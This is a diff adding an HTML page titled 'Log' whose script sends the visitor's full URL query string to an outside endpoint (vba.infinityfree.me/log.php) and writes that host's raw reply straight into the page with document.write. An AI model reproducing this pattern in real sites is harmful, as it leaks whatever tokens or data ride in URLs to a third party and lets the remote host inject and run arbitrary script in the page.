@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Log</title>
+</head>
+<body>
+  <div id="output">Processing...</div>
+  <script>
+    async function forwardAndRespond() {
+      // 1. Grab all query arguments from Site 1 URL
+      const queryParams = window.location.search;
+
+      // Target URL on Site 2
+      const targetUrl = "https://vba.infinityfree.me/log.php" + queryParams;
+
+      try {
+        // 2. Send request to Site 2
+        const response = await fetch(targetUrl);
+       
+        // 3. Extract full text reply regardless of status (200, 404, 500, etc.)
+        const data = await response.text();
+
+        // 4. Overwrite Site 1's page with Site 2's raw reply
+        document.open();
+        document.write(data);
+        document.close();
+      } catch (err) {
+        // Fallback response output if network/CORS fails
+        document.body.innerText = "Fetch Error: " + err.message;
+      }
+    }
+    forwardAndRespond();
+  </script>
+</body>
+</html>
